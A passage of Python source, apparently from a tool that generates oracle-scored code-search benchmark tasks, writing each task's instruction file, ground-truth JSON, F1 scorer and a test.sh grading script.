    # Remove "containing matches for the patterns `X`, `Y`, `Z`" phrases,
    # replacing with a description-aware clause
    result = _PATTERNS_PHRASE.sub(replacement, question)
    # Remove remaining backtick-wrapped patterns
    result = _BACKTICK_PATTERN.sub("the relevant patterns", result)
    # Collapse multiple "the relevant patterns" into one
    result = re.sub(
        r"(the relevant patterns(?:,\s*)?){2,}",
        "the relevant patterns",
        result,
    )
    # Clean up whitespace
    result = re.sub(r"  +", " ", result).strip()
    return result


def _write_oracle_task(
    task: Task,
    task_dir: Path,
    tests_dir: Path,
    repo_path: Path,
    safe_id: str,
    *,
    curation_backends: tuple[str, ...] = (),
) -> None:
    """Write an oracle-verified org-scale task.

    Produces::

        task_dir/
            instruction.md       (the question)
            ground_truth.json    (expected answer + commit SHA)
            tests/test.sh        (calls oracle-check, writes reward.txt)
            metadata.json
    """
    repo_name = repo_path.name
    language = task.metadata.language or "unknown"
    question = task.metadata.issue_body or task.metadata.description

    # MCP-advantaged families embed the symbol name and definition file
    # as essential task information — stripping them makes the task ambiguous.
    # Pattern-based families strip regex hints so the agent must discover them.
    is_mcp_family = task.metadata.category in _MCP_CATEGORIES

    if is_mcp_family:
        discovery_question = question
        discovery_title = task.metadata.issue_title or (
            f"Find {task.metadata.category} patterns in {repo_name}"
        )
    else:
        family_desc = _get_family_description(task.metadata.category)
        discovery_question = _strip_location_hints(question, family_desc)
        discovery_title = f"Find {task.metadata.category} patterns in {repo_name}"

    def _build_instruction(q: str, extra_sections: str = "") -> str:
        return (
            f"# {discovery_title}\n\n"
            f"**Repository:** {repo_name}\n"
            f"**Language:** {language}\n\n"
            "## Question\n\n"
            f"{q}\n\n"
            f"{extra_sections}"
            "## Answer Format\n\n"
            "Write your answer to `answer.txt` in the repository root, "
            "listing one file path per line. Do not include explanations "
            "in the file — only file paths.\n\n"
            "## Task Contract\n\n"
            f"- `TASK_REPO_ROOT={repo_path}`\n"
        )

    (task_dir / "instruction.md").write_text(
        _build_instruction(discovery_question), encoding="utf-8"
    )

    # ground_truth.json — oracle answer + commit + pattern provenance
    has_curation = bool(task.verification.oracle_tiers)
    ground_truth: dict[str, object] = {
        "schema_version": 2 if has_curation else 1,
        "oracle_type": task.verification.oracle_type,
        "expected": list(task.verification.oracle_answer),
        "commit": task.metadata.ground_truth_commit,
        "pattern_used": task.metadata.category,
        # ``repo`` powers the oracle's pass-2 path matching: agents that
        # report paths as ``<repo>/<path>`` or ``/abs/.../<repo>/<path>``
        # should still match oracle entries stored as bare ``<path>``.
        "repo": task.repo,
    }
    if task.metadata.ground_truth_commits:
        ground_truth["commits"] = {
            repo_name: sha for repo_name, sha in task.metadata.ground_truth_commits
        }
    if has_curation:
        ground_truth["oracle_tiers"] = dict(task.verification.oracle_tiers)
        # Curation provenance summary (Risk 7: summary only, no raw data)
        ground_truth["curation"] = {
            "backends_used": (
                list(curation_backends) if curation_backends else ["curated"]
            ),
            "file_count": len(task.verification.oracle_tiers),
        }
    (task_dir / "ground_truth.json").write_text(
        json.dumps(ground_truth, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )

    # tests/oracle.py — self-contained F1 scorer (no codeprobe dependency)
    (tests_dir / "oracle.py").write_text(_ORACLE_PY, encoding="utf-8")

    # tests/test.sh — calls oracle.py, writes reward.txt
    test_script = (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n\n"
        f"# Oracle verification for org-scale task {safe_id}\n"
        'SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"\n'
        'TASK_DIR="$(dirname "$SCRIPT_DIR")"\n\n'
        "# Fallback: if agent wrote to stdout instead of answer.txt, use $AGENT_OUTPUT\n"
        'if [ ! -f "$TASK_DIR/answer.txt" ] && [ -n "${AGENT_OUTPUT:-}" ] && [ -f "$AGENT_OUTPUT" ]; then\n'
        '    cp "$AGENT_OUTPUT" "$TASK_DIR/answer.txt"\n'
        "fi\n\n"
        "# Self-contained oracle check — no codeprobe install required\n"
        'python3 "$SCRIPT_DIR/oracle.py" "$TASK_DIR"\n'
    )
    test_sh_path = tests_dir / "test.sh"
    test_sh_path.write_text(test_script, encoding="utf-8")
    test_sh_path.chmod(0o755)

    # metadata.json
    (task_dir / "metadata.json").write_text(
        json.dumps(asdict(task), indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )
